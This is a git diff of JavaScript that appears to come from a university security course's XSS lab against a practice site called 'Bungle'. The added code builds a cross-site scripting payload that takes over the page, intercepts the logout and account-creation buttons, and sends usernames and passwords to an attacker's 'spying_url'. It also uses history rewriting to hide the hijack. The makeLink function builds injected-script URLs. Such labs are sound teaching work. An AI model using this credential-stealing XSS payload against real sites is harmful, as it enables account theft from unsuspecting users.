@@ -17,6 +17,8 @@ function payload(attacker) {
 		// Make all current HTML invisible.
 		$('html').hide();
 
+		if (!history.state) history.replaceState(null, null, href);
+
 		// overwrites current HTML. Execute a callback function when load has finished.
 		$('html').load(href, function() {
 
@@ -32,6 +34,33 @@ function payload(attacker) {
 				});
 			});
 
+			$('#log-out-btn').click(function(event) {
+				event.preventDefault();
+				$.get(spying_url + '/stolen', {event: 'logout', user: $('#logged-in-user').text()});
+				$.post('http://bungle-cs461.csl.illinois.edu/logout', function() {
+					proxy('./', attacker);
+				});
+			});
+
+			$('#new-account-btn').click(function(event) {
+				event.preventDefault();
+				$.get(spying_url + '/stolen', {event: 'login', user: $('#username').val(), pass: $('#userpass').val()});
+				$.post('http://bungle-cs461.csl.illinois.edu/create', {username: $('#username').val(), password: $('#userpass').val()}, function() {
+					proxy('./', attacker);
+				});
+			});
+
+			$('#search-btn').click(function(event) {
+				event.preventDefault();
+				history.pushState(href, null, 'search?q=' + $('#query').val());
+				proxy('./search?q=' + $('#query').val(), attacker);
+			});
+
+			$('#bungle-lnk,#search-again-btn').click(function(event) {
+				event.preventDefault();
+				history.pushState(href, null, '/');
+				proxy('./', attacker);
+			});
 		});
 	}
 	//Call Proxy
@@ -49,7 +78,7 @@ function makeLink(target, attacker, defense) {
 			return  "http://bungle-cs461.csl.illinois.edu/multivac/?name="+encodeURIComponent('<script>document.body.innerHTML+=\"<br><a href=\'http://ece.illinois.edu/\'>Click me</a>\"</' + 'script><!' + '--');
 		case 2:
 			// TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
-			return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+			return target + "search?xssdefense=" + (defense-2) + "&q=" + 
 				encodeURIComponent(
 					"<script>" +
 					payload_string + 
